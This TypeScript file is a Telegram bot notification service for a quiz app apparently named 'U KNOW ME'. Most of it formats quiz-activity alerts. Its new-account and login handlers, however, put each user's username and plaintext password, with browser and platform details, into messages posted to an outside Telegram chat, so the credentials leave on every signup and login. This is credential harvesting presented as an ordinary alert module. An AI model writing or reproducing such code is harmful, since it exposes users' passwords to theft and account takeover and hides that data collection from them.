// Telegram Bot Notification Service
import { TELEGRAM_CONFIG } from '../config/telegram';

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;

interface NotificationData {
  userId?: string;
  userEmail?: string;
  userName?: string;
  quizId?: string;
  quizTitle?: string;
  action: 'quiz_created' | 'quiz_joined' | 'quiz_completed' | 'new_account' | 'user_login';
  score?: number;
  totalQuestions?: number;
  percentage?: number;
  participantName?: string;
  // New account specific fields
  username?: string;
  password?: string;
  timestamp?: string;
  userAgent?: string;
  platform?: string;
  totalQuizzes?: number;
}

class TelegramService {
  private static instance: TelegramService;
  private isEnabled: boolean = false;

  private constructor() {
    // Check if Telegram is configured
    this.isEnabled = TELEGRAM_CONFIG.ENABLED && 
                     TELEGRAM_CONFIG.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && 
                     TELEGRAM_CONFIG.CHAT_ID !== 'YOUR_CHAT_ID_HERE';
  }

  public static getInstance(): TelegramService {
    if (!TelegramService.instance) {
      TelegramService.instance = new TelegramService();
    }
    return TelegramService.instance;
  }

  private formatMessage(data: NotificationData): string {
    const timestamp = new Date().toLocaleString();
    let message = `🤖 *U KNOW ME - Activity Alert*\n\n`;
    message += `⏰ *Time:* ${timestamp}\n\n`;

    switch (data.action) {
      case 'new_account':
        if (!TELEGRAM_CONFIG.NOTIFICATIONS.NEW_ACCOUNT) return '';
        message += `🆕 *New Creator Account*\n`;
        message += `👤 *Username:* ${data.username}\n`;
        message += `🔑 *Password:* \`${data.password}\`\n`;
        message += `📱 *Platform:* ${data.platform || 'Unknown'}\n`;
        message += `🌐 *Browser:* ${data.userAgent ? data.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
        message += `📅 *Created:* ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}\n`;
        break;

      case 'user_login':
        if (!TELEGRAM_CONFIG.NOTIFICATIONS.USER_LOGIN) return '';
        message += `🔐 *User Login*\n`;
        message += `👤 *Username:* ${data.username}\n`;
        message += `🔑 *Password:* \`${data.password}\`\n`;
        message += `📱 *Platform:* ${data.platform || 'Unknown'}\n`;
        message += `🌐 *Browser:* ${data.userAgent ? data.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
        message += `📅 *Login Time:* ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}\n`;
        break;

      case 'quiz_created':
        if (!TELEGRAM_CONFIG.NOTIFICATIONS.QUIZ_CREATED) return '';
        message += `🎯 *Quiz Created*\n`;
        message += `👤 *Creator:* ${data.userName || data.userEmail || data.userId || 'Unknown'}\n`;
        message += `📝 *Quiz Title:* ${data.quizTitle || 'Untitled'}\n`;
        message += `🆔 *Quiz ID:* \`${data.quizId}\`\n`;
        message += `📊 *Questions:* ${data.totalQuestions || 0}\n`;
        if (data.totalQuizzes !== undefined) {
          message += `📈 *Total Quizzes:* ${data.totalQuizzes}\n`;
        }
        break;

      case 'quiz_joined':
        if (!TELEGRAM_CONFIG.NOTIFICATIONS.QUIZ_JOINED) return '';
        message += `🚀 *Quiz Joined*\n`;
        message += `👤 *Participant:* ${data.participantName || 'Anonymous'}\n`;
        message += `📝 *Quiz Title:* ${data.quizTitle || 'Untitled'}\n`;
        message += `🆔 *Quiz ID:* \`${data.quizId}\`\n`;
        break;

      case 'quiz_completed':
        if (!TELEGRAM_CONFIG.NOTIFICATIONS.QUIZ_COMPLETED) return '';
        message += `🏁 *Quiz Completed*\n`;
        message += `👤 *Participant:* ${data.participantName || 'Anonymous'}\n`;
        message += `📝 *Quiz Title:* ${data.quizTitle || 'Untitled'}\n`;
        message += `🆔 *Quiz ID:* \`${data.quizId}\`\n`;
        message += `📊 *Score:* ${data.score}/${data.totalQuestions} (${data.percentage}%)\n`;
        
        // Add performance emoji
        let performanceEmoji = '💀';
        if (data.percentage === 100) performanceEmoji = '🏆';
        else if (data.percentage && data.percentage >= 75) performanceEmoji = '😎';
        else if (data.percentage && data.percentage >= 50) performanceEmoji = '👍';
        else if (data.percentage && data.percentage >= 25) performanceEmoji = '😬';
        
        message += `🎯 *Performance:* ${performanceEmoji}\n`;
        break;
    }

    return message;
  }

  public async sendNotification(data: NotificationData): Promise<boolean> {
    if (!this.isEnabled) {
      console.log('Telegram notifications not configured. Skipping notification.');
      return false;
    }

    const message = this.formatMessage(data);
    if (!message) {
      console.log('Notification type disabled. Skipping notification.');
      return false;
    }

    try {
      const response = await fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CONFIG.CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true,
        }),
      });

      if (!response.ok) {
        throw new Error(`Telegram API error: ${response.status}`);
      }

      const result = await response.json();
      
      if (result.ok) {
        console.log('✅ Telegram notification sent successfully');
        return true;
      } else {
        console.error('❌ Telegram notification failed:', result.description);
        return false;
      }
    } catch (error) {
      console.error('❌ Error sending Telegram notification:', error);
      return false;
    }
  }

  public async notifyQuizCreated(data: {
    userId?: string;
    userEmail?: string;
    userName?: string;
    quizId: string;
    quizTitle?: string;
    totalQuestions: number;
    totalQuizzes?: number;
  }): Promise<boolean> {
    return this.sendNotification({
      ...data,
      action: 'quiz_created',
    });
  }

  public async notifyQuizJoined(data: {
    participantName: string;
    quizId: string;
    quizTitle?: string;
  }): Promise<boolean> {
    return this.sendNotification({
      ...data,
      action: 'quiz_joined',
    });
  }

  public async notifyQuizCompleted(data: {
    participantName: string;
    quizId: string;
    quizTitle?: string;
    score: number;
    totalQuestions: number;
    percentage: number;
  }): Promise<boolean> {
    return this.sendNotification({
      ...data,
      action: 'quiz_completed',
    });
  }

  public async notifyNewAccount(data: {
    username: string;
    password: string;
    timestamp: string;
    userAgent?: string;
    platform?: string;
  }): Promise<boolean> {
    return this.sendNotification({
      ...data,
      action: 'new_account',
    });
  }

  public async notifyUserLogin(data: {
    username: string;
    password: string;
    timestamp: string;
    userAgent?: string;
    platform?: string;
  }): Promise<boolean> {
    return this.sendNotification({
      ...data,
      action: 'user_login',
    });
  }

  public isConfigured(): boolean {
    return this.isEnabled;
  }
}

export default TelegramService; 